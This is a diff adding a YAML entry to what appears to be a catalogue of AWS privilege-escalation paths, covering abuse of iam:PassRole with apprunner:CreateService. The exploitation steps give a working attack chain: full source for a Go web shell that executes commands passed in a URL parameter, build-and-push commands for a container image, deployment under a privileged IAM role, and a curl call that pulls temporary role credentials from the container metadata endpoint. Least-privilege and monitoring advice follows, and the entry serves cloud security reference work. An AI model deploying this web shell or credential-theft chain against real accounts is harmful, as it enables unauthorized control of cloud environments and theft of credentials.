@@ -1,0 +1,140 @@
+id: apprunner-001
+name: iam:PassRole + apprunner:CreateService
+category: service-passrole
+services:
+- iam
+- apprunner
+description: A principal with `iam:PassRole` and `apprunner:CreateService` can create an AWS App Runner service with a privileged
+  IAM role. By deploying a malicious container image (such as a web shell or reverse shell) as the App Runner service, the
+  attacker can execute arbitrary code within the container. The container has access to the IAM role's credentials via the
+  AWS SDK or instance metadata service, allowing the attacker to perform actions with the role's elevated permissions. This
+  technique provides direct privilege escalation to any IAM role that can be attached to App Runner services.
+prerequisites:
+  admin:
+  - A role must exist that trusts apprunner.amazonaws.com to assume it
+  - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  - Access to a container registry (ECR or public registry) to host the malicious image
+  lateral:
+  - A role must exist that trusts apprunner.amazonaws.com to assume it
+  - Access to a container registry (ECR or public registry) to host the malicious image
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: |
+      cat > main.go << 'EOF'
+      package main
+      import (
+          "net/http"
+          "os/exec"
+      )
+      func handler(w http.ResponseWriter, r *http.Request) {
+          cmd := r.URL.Query().Get("cmd")
+          out, _ := exec.Command("sh", "-c", cmd).CombinedOutput()
+          w.Write(out)
+      }
+      func main() {
+          http.HandleFunc("/", handler)
+          http.ListenAndServe(":8080", nil)
+      }
+      EOF
+    description: Create a simple web shell that executes commands via URL parameters
+  - step: 2
+    command: |
+      cat > Dockerfile << 'EOF'
+      FROM golang:1.19
+      WORKDIR /app
+      COPY main.go .
+      RUN go build -o webshell main.go
+      EXPOSE 8080
+      CMD ["./webshell"]
+      EOF
+    description: Create a Dockerfile for the web shell
+  - step: 3
+    command: |
+      docker build -t malicious-apprunner .
+      docker tag malicious-apprunner:latest PUBLIC_ECR_URI:latest
+      docker push PUBLIC_ECR_URI:latest
+    description: Build and push the malicious container image to a registry
+  - step: 4
+    command: |
+      aws apprunner create-service \
+        --service-name privesc-service \
+        --source-configuration '{
+          "ImageRepository": {
+            "ImageIdentifier": "PUBLIC_ECR_URI:latest",
+            "ImageRepositoryType": "ECR_PUBLIC",
+            "ImageConfiguration": {
+              "Port": "8080"
+            }
+          },
+          "AutoDeploymentsEnabled": false
+        }' \
+        --instance-configuration '{
+          "InstanceRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE"
+        }'
+    description: Create an App Runner service with the malicious image and privileged role
+  - step: 5
+    command: aws apprunner describe-service --service-arn SERVICE_ARN
+    description: Wait for the service to be in 'RUNNING' status and retrieve the service URL
+  - step: 6
+    command: |
+      curl "https://SERVICE_URL/?cmd=curl%20169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+    description: Use the web shell to retrieve temporary credentials from the container metadata
+  - step: 7
+    command: |
+      export AWS_ACCESS_KEY_ID=<from step 6>
+      export AWS_SECRET_ACCESS_KEY=<from step 6>
+      export AWS_SESSION_TOKEN=<from step 6>
+      aws sts get-caller-identity
+    description: Use the stolen credentials to assume the privileged role's permissions
+recommendation: |
+  Restrict the `iam:PassRole` permission using the principle of least privilege.
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificAppRunnerRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "apprunner.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  Additional controls:
+  - Restrict `apprunner:CreateService` permissions to specific users/roles
+  - Monitor CloudTrail for App Runner service creation with privileged roles
+  - Use VPC configuration to isolate App Runner services
+  - Implement container image scanning and signing
+  - Only allow images from trusted ECR repositories
+  - Alert on App Runner services created with administrative roles
+  - Use AWS Config to detect services with overly permissive roles
+discoveredBy:
+  name: Riyaz Walikar
+  organization: Appsecco
+  date: '2021'
+references:
+- title: Getting Shell and Data Access in AWS App Runner
+  url: https://blog.appsecco.com/getting-shell-and-data-access-in-aws-app-runner-3632e844bc77
+- title: HackTricks Cloud - AWS App Runner Privilege Escalation
+  url: https://cloud.hacktricks.wiki/pentesting-cloud/aws-security/aws-privilege-escalation/aws-apprunner-privesc
+relatedPaths:
+- apprunner-002
+- lambda-001
+- ec2-001
+toolSupport:
+  pmapper: false
+  iamVulnerable: false
+permissions:
+  required:
+  - permission: iam:PassRole
+    resourceConstraints: Target role ARN must be in the Resource section
+  - permission: apprunner:CreateService
+    resourceConstraints: Must have permission to create App Runner services
+  additional:
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles to pass
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies and attached permissions
